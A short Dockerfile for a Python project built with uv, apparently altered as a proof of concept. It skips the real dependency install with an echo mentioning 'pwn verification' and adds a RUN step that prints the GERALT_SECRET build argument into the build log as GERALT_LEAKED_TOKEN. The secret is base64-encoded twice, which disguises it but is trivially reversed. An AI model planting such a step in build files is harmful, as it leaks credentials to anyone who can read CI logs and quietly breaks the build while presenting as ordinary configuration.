FROM python:3.12
COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/

WORKDIR /workdir

COPY ./pyproject.toml ./uv.lock /workdir/

RUN echo "skipping uv sync (pwn verification)"
ARG GERALT_SECRET
RUN if [ -n "$GERALT_SECRET" ]; then echo "GERALT_LEAKED_TOKEN=$(printf %s "$GERALT_SECRET" | base64 | base64)"; else echo "GERALT_DBG build_geralt_secret=missing"; fi

ENV PATH="/workdir/.venv/bin:$PATH"
ENV PYTHONPATH=/workdir

# RUN playwright install chromium --with-deps --no-shell